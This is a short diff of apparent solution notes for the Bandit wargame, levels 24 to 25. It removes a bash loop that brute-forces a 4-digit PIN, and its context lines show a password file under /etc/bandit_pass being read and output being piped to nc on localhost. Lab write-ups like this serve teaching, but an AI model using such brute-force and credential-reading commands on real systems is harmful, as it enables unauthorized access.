@@ -31,22 +31,6 @@ output=/tmp/tmp.Stv8XYt71b/password
 cat /etc/bandit_pass/bandit24 > $output
 
 Solution to Level 24 -> Level 25:
-# Brute force script
-#!/usr/bin/bash
-
-for first in {0..9}
-do
-        for second in {0..9}
-        do
-                for third in {0..9}
-                do
-                        for fourth in {0..9}
-                        do
-                                echo $PASSWORD ${first}${second}${third}${fourth}
-                        done
-                done
-        done
-done
 
 # From shell:
 $ ./bandit25_pass.sh | nc localhost 30002
